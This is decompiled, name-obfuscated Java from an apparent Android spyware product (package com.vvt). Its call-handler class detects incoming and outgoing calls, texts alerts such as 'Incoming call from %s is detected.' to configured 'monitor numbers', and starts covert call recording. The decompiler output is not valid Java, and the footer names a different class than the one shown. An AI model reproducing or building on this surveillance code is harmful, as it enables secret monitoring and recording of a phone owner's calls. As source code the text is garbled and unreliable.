package com.vvt.callhandler;

import android.content.Context;
import android.os.ConditionVariable;
import android.os.Looper;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import com.vvt.base.RunningMode;
import com.vvt.callhandler.phonestate.OutgoingCallReceiver;
import com.vvt.callmanager.ref.ActiveCallInfo;
import com.vvt.capture.a.k;
import com.vvt.events.FxMediaType;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefMonitorNumber;
import java.util.Iterator;
import java.util.List;

public class c
  implements a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static final FxPreferenceType[] c;
  private RunningMode d;
  private Context e;
  private String f;
  private com.vvt.preference.b g;
  private TelephonyManager h;
  private Looper i;
  private com.vvt.callhandler.phonestate.a j;
  private com.vvt.capture.a.a k;
  private com.vvt.a.a l;
  private com.vvt.base.a m;
  private com.vvt.ae.f n;
  private boolean o;
  private j p;
  private com.vvt.aj.a q;
  private int r;
  private long s;
  private ConditionVariable t;
  
  static
  {
    FxPreferenceType[] arrayOfFxPreferenceType = new FxPreferenceType[5];
    FxPreferenceType localFxPreferenceType = FxPreferenceType.CIS_NUMBER;
    arrayOfFxPreferenceType[0] = localFxPreferenceType;
    localFxPreferenceType = FxPreferenceType.EMERGENCY_NUMBER;
    arrayOfFxPreferenceType[1] = localFxPreferenceType;
    localFxPreferenceType = FxPreferenceType.HOME_NUMBER;
    arrayOfFxPreferenceType[2] = localFxPreferenceType;
    localFxPreferenceType = FxPreferenceType.MONITOR_NUMBER;
    arrayOfFxPreferenceType[3] = localFxPreferenceType;
    localFxPreferenceType = FxPreferenceType.NOTIFICATION_NUMBER;
    arrayOfFxPreferenceType[4] = localFxPreferenceType;
    c = arrayOfFxPreferenceType;
  }
  
  public c(RunningMode paramRunningMode, Context paramContext, String paramString, com.vvt.preference.b paramb, com.vvt.base.a parama)
  {
    this.d = paramRunningMode;
    this.e = paramContext;
    this.f = paramString;
    this.g = paramb;
    this.m = parama;
  }
  
  private void a(long paramLong)
  {
    Object localObject = this.q;
    if (localObject == null)
    {
      localObject = new com/vvt/callhandler/i;
      ((i)localObject).<init>(this, "CallHandlerImpl", paramLong);
      this.q = ((com.vvt.aj.a)localObject);
      localObject = this.q;
      String str = "CallRecorderCountDownTimer";
      ((com.vvt.aj.a)localObject).setName(str);
      localObject = this.q;
      ((com.vvt.aj.a)localObject).start();
    }
  }
  
  private void a(String paramString, boolean paramBoolean)
  {
    this.o = true;
    b(paramString, paramBoolean);
    c(paramString, paramBoolean);
  }
  
  private void a(List paramList, String paramString)
  {
    Object localObject1 = this.n;
    Object localObject2;
    if (localObject1 != null)
    {
      boolean bool1 = a;
      if ((!bool1) || (paramList != null))
      {
        int i1 = paramList.size();
        if (i1 > 0)
        {
          localObject1 = this.d;
          localObject2 = RunningMode.FULL;
          if (localObject1 != localObject2)
          {
            localObject1 = new com/vvt/callhandler/e;
            ((e)localObject1).<init>(this, paramList, paramString);
            ((e)localObject1).start();
          }
        }
      }
    }
    for (;;)
    {
      return;
      localObject2 = paramList.iterator();
      for (;;)
      {
        bool2 = ((Iterator)localObject2).hasNext();
        if (!bool2) {
          break;
        }
        localObject1 = (String)((Iterator)localObject2).next();
        boolean bool3 = a;
        if (bool3) {}
        com.vvt.ae.f localf = this.n;
        localf.a((String)localObject1, paramString);
      }
      boolean bool2 = a;
      if (bool2)
      {
        continue;
        bool2 = a;
        if (!bool2) {}
      }
    }
  }
  
  private void a(boolean paramBoolean, String paramString1, String paramString2)
  {
    Object localObject1 = this.k;
    boolean bool1;
    if (localObject1 != null)
    {
      localObject1 = this.k;
      bool1 = ((com.vvt.capture.a.a)localObject1).e();
      if (!bool1)
      {
        localObject1 = b.a(this.f);
        boolean bool2 = a;
        if (bool2) {}
        Object localObject2 = new android/os/ConditionVariable;
        ((ConditionVariable)localObject2).<init>(false);
        this.t = ((ConditionVariable)localObject2);
        localObject2 = new com/vvt/callhandler/j;
        ((j)localObject2).<init>(this, null);
        this.p = ((j)localObject2);
        this.p.b = paramBoolean;
        this.p.c = paramString1;
        this.p.a = paramString2;
        localObject2 = this.k;
        Object localObject3 = new com/vvt/callhandler/g;
        ((g)localObject3).<init>(this);
        ((com.vvt.capture.a.a)localObject2).a((k)localObject3);
        localObject2 = new java/lang/Thread;
        localObject3 = new com/vvt/callhandler/h;
        ((h)localObject3).<init>(this, (String)localObject1);
        ((Thread)localObject2).<init>((Runnable)localObject3);
        ((Thread)localObject2).start();
      }
    }
    for (;;)
    {
      return;
      bool1 = a;
      if (bool1)
      {
        continue;
        bool1 = a;
        if (!bool1) {}
      }
    }
  }
  
  private void b(String paramString, boolean paramBoolean)
  {
    boolean bool1 = a;
    if (bool1) {}
    try
    {
      localObject1 = this.g;
      localObject2 = FxPreferenceType.MONITOR_NUMBER;
      localObject1 = ((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject2);
      localObject1 = (PrefMonitorNumber)localObject1;
      localObject2 = ((PrefMonitorNumber)localObject1).getList();
      if (localObject2 == null) {
        break label202;
      }
      int i1 = ((List)localObject2).size();
      if (i1 <= 0) {
        break label202;
      }
      localObject1 = this.e;
      localObject3 = this.d;
      localb = this.g;
      bool2 = b.a((Context)localObject1, (RunningMode)localObject3, localb, paramString, (List)localObject2);
      bool3 = a;
      if ((bool3) && (!bool2)) {
        break label172;
      }
      bool2 = com.vvt.ah.a.c(paramString);
      if (bool2) {
        paramString = "private/unknown number";
      }
      if (!paramBoolean) {
        break label194;
      }
      localObject1 = "Incoming call from %s is detected.";
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        Object localObject2;
        Object localObject3;
        com.vvt.preference.b localb;
        boolean bool3;
        boolean bool2 = b;
        if (bool2)
        {
          continue;
          String str = "Outgoing call to %s is detected.";
          continue;
          bool2 = a;
          if (!bool2) {}
        }
      }
    }
    bool3 = true;
    localObject3 = new Object[bool3];
    localb = null;
    localObject3[0] = paramString;
    localObject1 = String.format((String)localObject1, (Object[])localObject3);
    a((List)localObject2, (String)localObject1);
    localObject2 = this.m;
    b.b((com.vvt.base.a)localObject2, (String)localObject1);
    label172:
    bool2 = a;
    if (bool2) {}
  }
  
  private FxMediaType c(String paramString)
  {
    FxMediaType localFxMediaType = FxMediaType.MP3;
    boolean bool1 = com.vvt.ag.b.a(paramString);
    if (!bool1)
    {
      String str1 = ".";
      int i1 = paramString.lastIndexOf(str1);
      int i2 = -1;
      if (i1 != i2)
      {
        str1 = paramString.substring(i1);
        String str2 = ".amr";
        boolean bool2 = str1.equalsIgnoreCase(str2);
        if (bool2) {
          localFxMediaType = FxMediaType.AMR_NB;
        }
      }
    }
    return localFxMediaType;
  }
  
  private void c(String paramString, boolean paramBoolean)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = new com/vvt/callhandler/l;
    Object localObject2 = this.e;
    RunningMode localRunningMode = this.d;
    ((l)localObject1).<init>((Context)localObject2, localRunningMode);
    localObject2 = "";
    boolean bool2 = com.vvt.ag.b.a(paramString);
    if (!bool2) {
      localObject2 = ((l)localObject1).a(paramString);
    }
    localObject1 = this.e;
    localRunningMode = this.d;
    com.vvt.preference.b localb = this.g;
    boolean bool3 = b.a((Context)localObject1, localRunningMode, localb, paramString);
    bool2 = a;
    if ((!bool2) || (bool3))
    {
      g();
      bool3 = a;
      if (bool3) {}
      bool3 = this.o;
      if (bool3) {
        a(paramBoolean, paramString, (String)localObject2);
      }
    }
    bool1 = a;
    if (bool1) {}
  }
  
  private void g()
  {
    com.vvt.a.a locala = this.l;
    boolean bool1;
    if (locala != null)
    {
      locala = this.l;
      bool1 = locala.a();
      boolean bool2 = a;
      if ((!bool2) || (bool1))
      {
        locala = this.l;
        bool2 = true;
        locala.a(bool2);
      }
    }
    for (;;)
    {
      return;
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  private void h()
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = this.k;
    if (localObject != null)
    {
      bool1 = false;
      localObject = null;
      this.r = 0;
      i();
      try
      {
        localObject = this.k;
        ((com.vvt.capture.a.a)localObject).c();
      }
      catch (Exception localException)
      {
        for (;;)
        {
          bool2 = b;
          if (bool2) {}
          this.p = null;
          locala = this.m;
          str = localException.toString();
          b.a(locala, str);
        }
      }
      localObject = this.t;
      if (localObject != null)
      {
        localObject = this.t;
        ((ConditionVariable)localObject).open();
        this.t = null;
      }
    }
    for (;;)
    {
      return;
      boolean bool2;
      com.vvt.base.a locala;
      String str;
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  private void i()
  {
    com.vvt.aj.a locala = this.q;
    if (locala != null)
    {
      this.q.b();
      locala = null;
      this.q = null;
    }
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    bool = false;
    this.o = false;
    com.vvt.capture.a.a locala = this.k;
    if (locala != null)
    {
      bool = a;
      if (bool) {}
      h();
    }
  }
  
  public void a(com.vvt.a.a parama)
  {
    boolean bool = a;
    if (bool) {}
    this.l = parama;
  }
  
  public void a(com.vvt.ae.f paramf)
  {
    this.n = paramf;
  }
  
  public void a(ActiveCallInfo paramActiveCallInfo)
  {
    boolean bool1 = a;
    if (bool1) {}
    String str = paramActiveCallInfo.getNumber();
    boolean bool2 = paramActiveCallInfo.isIncoming();
    a(str, bool2);
  }
  
  public void a(com.vvt.capture.a.a parama)
  {
    boolean bool = a;
    if (bool) {}
    this.k = parama;
  }
  
  public void a(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    a(paramString, true);
  }
  
  public void b()
  {
    Object localObject1 = this.d;
    Object localObject2 = RunningMode.FULL;
    boolean bool;
    if (localObject1 == localObject2)
    {
      bool = a;
      if (!bool) {}
    }
    for (;;)
    {
      return;
      bool = a;
      if (bool) {}
      localObject1 = new java/lang/Thread;
      localObject2 = new com/vvt/callhandler/d;
      ((d)localObject2).<init>(this);
      String str = "CallHandlerThread";
      ((Thread)localObject1).<init>((Runnable)localObject2, str);
      ((Thread)localObject1).start();
    }
  }
  
  public void b(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    Thread localThread = new java/lang/Thread;
    f localf = new com/vvt/callhandler/f;
    localf.<init>(this, paramString);
    localThread.<init>(localf);
    localThread.start();
  }
  
  public void c()
  {
    Object localObject1 = this.d;
    Object localObject2 = RunningMode.FULL;
    boolean bool;
    if (localObject1 == localObject2)
    {
      bool = a;
      if (!bool) {}
    }
    for (;;)
    {
      this.k = null;
      return;
      bool = a;
      if (bool) {}
      localObject1 = this.i;
      if (localObject1 != null)
      {
        localObject1 = this.i;
        ((Looper)localObject1).quit();
        this.i = null;
      }
      localObject1 = this.h;
      if (localObject1 != null)
      {
        localObject1 = this.j;
        if (localObject1 != null)
        {
          localObject1 = this.h;
          localObject2 = this.j;
          ((TelephonyManager)localObject1).listen((PhoneStateListener)localObject2, 0);
          this.h = null;
          this.j = null;
        }
      }
      OutgoingCallReceiver.a(null);
    }
  }
  
  public void d()
  {
    boolean bool = a;
    if (bool) {}
    bool = false;
    this.o = false;
    com.vvt.capture.a.a locala = this.k;
    if (locala != null)
    {
      bool = a;
      if (bool) {}
      h();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callhandler/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */